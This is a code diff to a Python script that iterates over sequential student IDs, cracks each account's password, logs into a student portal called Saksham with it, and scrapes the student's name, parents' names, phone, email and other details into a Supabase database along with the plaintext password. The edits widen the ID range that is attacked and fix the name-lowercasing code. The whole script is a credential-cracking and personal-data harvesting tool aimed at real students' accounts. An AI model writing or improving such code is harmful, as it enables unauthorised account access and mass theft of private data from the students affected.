@@ -19,16 +19,16 @@ for handler in logging.getLogger().handlers:
 def main():
     database = SupabaseStudentDatabase()
 
-    for i in range(1200, 1300):
+    for i in range(1054, 1300):
 
         formatted = '{0:04}'.format(i)
         userid = "2023/" + formatted
 
         try:
             if database.getStudentData(userid) is not None:
-                logger.info(f"{userid} password already exist in database/being cracked")
+                logger.info(f"{userid} Password already exist in database/being cracked")
             else:
-                logger.info(f"{userid} password not found in database")
+                logger.info(f"{userid} Password not found in database")
 
                 # Working status set in database
                 working_dict = {
@@ -56,17 +56,12 @@ def main():
                     logger.info("Password found: " + password)
                     student = getStudentDataFromSaksham(userid, password)
 
-                    # Names are scraped in  uppercase from saksham dashboard
-                    student_name = student.student_name.lower
-                    mother_name = student.mother_name.lower
-                    father_name = student.father_name.lower
-
                     student_dict = {
                         "password": password,
                         "time_taken": elapsedTime,
-                        "student_name": student_name,
-                        "father_name": father_name,
-                        "mother_name": mother_name,
+                        "student_name": student.student_name.lower(),
+                        "father_name": student.father_name.lower(),
+                        "mother_name": student.mother_name.lower(),
                         "phone": student.phone,
                         "category": student.category,
                         "email": student.email,
@@ -81,7 +76,7 @@ def main():
                         "student_type": student.student_type,
                     }
                     database.addStudentData(userid, student_dict)
-                    logger.info(f"{userid} data retrieved and added to database")
+                    logger.info("Data retrieved and added to database")
 
         except Exception as e:
             logger.error(f"Error: {e}")
